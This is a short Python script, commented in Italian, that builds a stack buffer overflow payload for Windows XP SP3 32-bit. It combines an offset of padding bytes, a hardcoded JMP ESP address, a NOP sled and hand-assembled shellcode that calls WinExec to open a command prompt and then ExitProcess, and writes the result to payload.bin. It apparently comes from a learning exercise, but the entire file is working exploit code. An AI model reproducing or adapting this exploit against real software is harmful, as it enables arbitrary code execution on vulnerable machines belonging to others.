import struct
#-------------------------------/|------------------------------|\----------------------------------------------------
#------------------------------//|-----------PAYLOAD------------|\\---------------------------------------------------
#-----------------------------///|------------------------------|\\\--------------------------------------------------

#Build per windows xp 32 bit sp3, altre build diverse avranno jmp esp diversi, ergo per altre build trovare altri valori

#Valori trovati con immunity debugger dopo averla fatta crashare tramite payload di sole A
JMP_ESP     = 0x7C86467B
WINEXEC     = 0x7C8623AD
EXITPROCESS = 0x7C81CAFA
OFFSET      = 76
#reminder: si leggono al contrario cuz little-e
#WinExec("cmd /c start cmd", 1) serve per forzare ad aprire una nuova finestra CMD, altrimenti restavo sempre sulla stessa cmd
shellcode = (
    b"\x31\xC9" +               # xor ecx, ecx
    b"\x51" +                   # push ecx        ; null terminator
    b"\x68\x20\x63\x6D\x64" +   #push " cmd"
    b"\x68\x74\x61\x72\x74" +   # push "tart"
    b"\x68\x2F\x63\x20\x73" +   #push "/c s"
    b"\x68\x63\x6D\x64\x20" +   #push "cmd "
    b"\x8B\xC4" +               #mov eax, esp    ; puntatore a "cmd /c start cmd"
    b"\x6A\x01" +               # push 1          ; uCmdShow = visibile
    b"\x50" +                   # push eax        ; lpCmdLine
    b"\xBB" + struct.pack("<I", WINEXEC) +
    b"\xFF\xD3" +               # call WinExec
    b"\x31\xC9" +               #xor ecx, ecx
    b"\x51" +                   #push ecx        ; 0 per ExitProcess
    b"\xBB" + struct.pack("<I", EXITPROCESS) +
    b"\xFF\xD3"                 # call ExitProcess
)

#creazione payload effettivo
payload = b"A" * OFFSET
payload += struct.pack("<I", JMP_ESP)
payload += b"\x90" * 4
payload += shellcode

#salvo il payload in bin, 
#il motivo è che alcuni caratteri macchina non sono caratteri leggibili o riproducibili a mano
with open("payload.bin", "wb") as f:
    f.write(payload)

